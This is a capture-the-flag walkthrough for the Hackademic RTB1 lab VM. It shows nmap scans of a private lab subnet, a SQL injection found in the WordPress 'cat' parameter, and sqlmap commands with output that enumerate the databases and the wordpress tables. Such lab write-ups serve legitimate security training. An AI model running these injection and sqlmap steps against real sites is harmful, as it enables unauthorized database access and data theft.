# Hackademic: RTB1

## 1.Get VM IP

```bash
root@kali: nmap -sn 192.168.127.0/24
                
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 03:57 EDT
Nmap scan report for 192.168.127.1
Host is up (0.00052s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.127.140
Host is up (0.0015s latency).
MAC Address: 00:0C:29:F6:75:CB (VMware)
Nmap scan report for 192.168.127.254
Host is up (0.00041s latency).
MAC Address: 00:50:56:EF:E6:A0 (VMware)
Nmap scan report for 192.168.127.128
Host is up.
```

The machine IP is `192.168.127.140`, lets enumerate it.

## 2.Enumeration

```bash
root@kali: nmap -sV -sC 192.168.127.140 -oN fullscan

Nmap scan report for 192.168.127.140
Host is up (0.00079s latency).
Not shown: 988 filtered tcp ports (no-response), 10 filtered tcp ports (host-prohibited)
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
|_http-server-header: Apache/2.2.15 (Fedora)
|_http-title: Hackademic.RTB1  
| http-methods: 
|_  Potentially risky methods: TRACE
MAC Address: 00:0C:29:F6:75:CB (VMware)
```

## 2.1.Web Enumeration

Visit the main page and if you click on `Uncategorized` link on the bottom of the page a new url parameter will be used `cat=1`



this paramter is vulnerable to sql injection if you put a `"` after it :












i tried with `sqlmap` to inject into this paramter and get the database :

```bash
root@kali: sqlmap -u "http://192.168.127.140/Hackademic_RTB1/?cat=1" --batch --dbs

...
back-end DBMS: MySQL >= 5.0
[05:03:56] [INFO] fetching database names
[05:03:56] [INFO] resumed: 'information_schema'
[05:03:56] [INFO] resumed: 'mysql'
[05:03:56] [INFO] resumed: 'wordpress'
available databases [3]:
[*] information_schema
[*] mysql
[*] wordpress
...
```

all we need here is to get information from `wordpress` database.

- Get tables from this database :

```bash
root@kali: sqlmap -u "http://192.168.127.140/Hackademic_RTB1/?cat=1" --batch --dbs -D wordpress --tables

Database: wordpress
[9 tables]
+-------------------+
| wp_categories     |
| wp_comments       |
| wp_linkcategories |
| wp_links          |
| wp_options        |
| wp_post2cat       |
| wp_postmeta       |
| wp_posts          |
| wp_users          |
+-------------------+
```










